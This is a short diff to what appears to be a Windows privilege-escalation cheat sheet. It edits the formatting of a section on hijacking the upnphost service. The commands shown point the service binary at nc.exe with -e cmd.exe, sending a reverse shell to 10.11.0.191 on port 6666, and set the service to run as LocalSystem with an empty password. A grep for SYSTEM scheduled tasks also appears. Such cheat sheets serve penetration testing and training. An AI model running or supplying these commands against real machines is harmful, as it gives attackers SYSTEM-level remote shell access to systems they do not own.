@@ -179,8 +179,7 @@ cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 ## **Change the upnp service binary**
 `
 sc config upnphost binpath= "C:\Inetpub\nc.exe 10.11.0.191 6666 -e c:\Windows\system32\cmd.exe"`
-
-`sc config upnphost obj= ".\LocalSystem" password= ""`
+sc config upnphost obj= ".\LocalSystem" password= ""
 
 `sc config upnphost depend= ""`
 
